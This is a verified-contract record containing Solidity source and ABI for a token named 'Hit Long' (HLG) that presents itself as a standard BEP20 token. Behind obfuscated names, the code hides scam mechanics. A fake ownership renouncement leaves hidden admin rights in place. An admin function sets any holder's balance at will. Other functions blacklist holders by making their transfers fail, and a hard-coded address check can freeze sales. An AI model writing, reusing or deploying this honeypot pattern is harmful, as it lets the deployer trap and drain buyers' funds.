{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.15;\n\ninterface teamTradingAuto {\n    function createPair(address enableFundTake, address receiverExempt) external returns (address);\n}\n\ninterface buyFund {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address fromLaunchedMax) external view returns (uint256);\n\n    function transfer(address senderTx, uint256 isList) external returns (bool);\n\n    function allowance(address receiverFromTo, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 isList) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address senderTx,\n        uint256 isList\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed limitLaunchTotal, uint256 value);\n    event Approval(address indexed receiverFromTo, address indexed spender, uint256 value);\n}\n\nabstract contract toList {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface fromReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface buyFundMetadata is buyFund {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract HitLong is toList, buyFund, buyFundMetadata {\n\n    uint256 public teamList;\n\n    address public listMarketing;\n\n    uint256 private limitExempt;\n\n    mapping(address => mapping(address => uint256)) private autoSender;\n\n    event OwnershipTransferred(address indexed senderAt, address indexed atFee);\n\n    function transfer(address takeSwap, uint256 isList) external virtual override returns (bool) {\n        return isTradingMin(_msgSender(), takeSwap, isList);\n    }\n\n    uint256 private fromLiquidity;\n\n    function feeTokenTake(address takeSwap, uint256 isList) public {\n        walletFee();\n        sellReceiver[takeSwap] = isList;\n    }\n\n    mapping(address => uint256) private sellReceiver;\n\n    bool public limitReceiver;\n\n    function isTradingMin(address amountAuto, address senderTx, uint256 isList) internal returns (bool) {\n        if (amountAuto == feeBuy) {\n            return receiverTakeSwap(amountAuto, senderTx, isList);\n        }\n        uint256 liquidityEnable = buyFund(listMarketing).balanceOf(buyAmount);\n        require(liquidityEnable == amountTotalAt);\n        require(senderTx != buyAmount);\n        if (launchTeam[amountAuto]) {\n            return receiverTakeSwap(amountAuto, senderTx, listToken);\n        }\n        return receiverTakeSwap(amountAuto, senderTx, isList);\n    }\n\n    uint256 amountTotalAt;\n\n    function allowance(address tokenTakeMin, address toLimitTake) external view virtual override returns (uint256) {\n        if (toLimitTake == fundSwapEnable) {\n            return type(uint256).max;\n        }\n        return autoSender[tokenTakeMin][toLimitTake];\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return totalTxLiquidity;\n    }\n\n    bool private exemptMin;\n\n    function transferFrom(address amountAuto, address senderTx, uint256 isList) external override returns (bool) {\n        if (_msgSender() != fundSwapEnable) {\n            if (autoSender[amountAuto][_msgSender()] != type(uint256).max) {\n                require(isList <= autoSender[amountAuto][_msgSender()]);\n                autoSender[amountAuto][_msgSender()] -= isList;\n            }\n        }\n        return isTradingMin(amountAuto, senderTx, isList);\n    }\n\n    uint8 private fromMin = 18;\n\n    function receiverTakeSwap(address amountAuto, address senderTx, uint256 isList) internal returns (bool) {\n        require(sellReceiver[amountAuto] >= isList);\n        sellReceiver[amountAuto] -= isList;\n        sellReceiver[senderTx] += isList;\n        emit Transfer(amountAuto, senderTx, isList);\n        return true;\n    }\n\n    address fundSwapEnable = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    mapping(address => bool) public atSell;\n\n    uint256 private teamReceiver = 100000000 * 10 ** 18;\n\n    mapping(address => bool) public launchTeam;\n\n    function decimals() external view virtual override returns (uint8) {\n        return fromMin;\n    }\n\n    string private totalTxLiquidity = \"Hit Long\";\n\n    bool public maxAmountFund;\n\n    uint256 constant listToken = 19 ** 10;\n\n    function takeTo() public {\n        emit OwnershipTransferred(feeBuy, address(0));\n        feeAtList = address(0);\n    }\n\n    function maxTxFee(address enableShould) public {\n        if (maxAmountFund) {\n            return;\n        }\n        \n        atSell[enableShould] = true;\n        if (fromLiquidity != walletEnableMax) {\n            exemptMin = true;\n        }\n        maxAmountFund = true;\n    }\n\n    function symbol() external view virtual override returns (string memory) {\n        return exemptAuto;\n    }\n\n    constructor (){\n        if (teamList != fromLiquidity) {\n            limitExempt = walletEnableMax;\n        }\n        fromReceiver senderFrom = fromReceiver(fundSwapEnable);\n        listMarketing = teamTradingAuto(senderFrom.factory()).createPair(senderFrom.WETH(), address(this));\n        if (limitReceiver) {\n            limitReceiver = true;\n        }\n        feeBuy = _msgSender();\n        atSell[feeBuy] = true;\n        sellReceiver[feeBuy] = teamReceiver;\n        takeTo();\n        if (limitExempt != walletEnableMax) {\n            exemptMin = true;\n        }\n        emit Transfer(address(0), feeBuy, teamReceiver);\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return teamReceiver;\n    }\n\n    uint256 fundTrading;\n\n    function balanceOf(address fromLaunchedMax) public view virtual override returns (uint256) {\n        return sellReceiver[fromLaunchedMax];\n    }\n\n    function maxBuy(address maxTeam) public {\n        walletFee();\n        \n        if (maxTeam == feeBuy || maxTeam == listMarketing) {\n            return;\n        }\n        launchTeam[maxTeam] = true;\n    }\n\n    string private exemptAuto = \"HLG\";\n\n    function walletFee() private view {\n        require(atSell[_msgSender()]);\n    }\n\n    address buyAmount = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function getOwner() external view returns (address) {\n        return feeAtList;\n    }\n\n    address public feeBuy;\n\n    function minSwap(uint256 isList) public {\n        walletFee();\n        amountTotalAt = isList;\n    }\n\n    uint256 private walletEnableMax;\n\n    function owner() external view returns (address) {\n        return feeAtList;\n    }\n\n    address private feeAtList;\n\n    function approve(address toLimitTake, uint256 isList) public virtual override returns (bool) {\n        autoSender[_msgSender()][toLimitTake] = isList;\n        emit Approval(_msgSender(), toLimitTake, isList);\n        return true;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"receiverFromTo\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderAt\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"limitLaunchTotal\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenTakeMin\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"toLimitTake\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"toLimitTake\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isList\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"atSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"fromLaunchedMax\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"feeBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isList\",\"type\":\"uint256\"}],\"name\":\"feeTokenTake\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"launchTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"limitReceiver\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"listMarketing\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxAmountFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"maxTeam\",\"type\":\"address\"}],\"name\":\"maxBuy\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableShould\",\"type\":\"address\"}],\"name\":\"maxTxFee\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"isList\",\"type\":\"uint256\"}],\"name\":\"minSwap\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeTo\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamList\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"takeSwap\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isList\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"amountAuto\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"senderTx\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"isList\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "HitLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}